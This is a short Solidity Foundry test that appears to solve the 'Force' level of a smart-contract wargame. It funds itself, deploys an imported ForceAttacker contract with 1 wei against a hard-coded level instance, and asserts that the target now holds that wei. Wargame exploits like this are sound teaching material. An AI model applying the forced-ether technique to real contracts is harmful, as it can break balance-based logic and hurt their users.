// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../instances/Ilevel07.sol";
import "../src/level07.sol";

contract Attacker is Test {
    Force level06 = Force(0x0D8664474d9209833499A7BdA087F20844eafA7B);

    function test() external {
        vm.deal(address(this), 1 ether);
        new ForceAttacker{value: 1 wei}(address(level06));

        assertEq(address(level06).balance, 1 wei);
    }
}
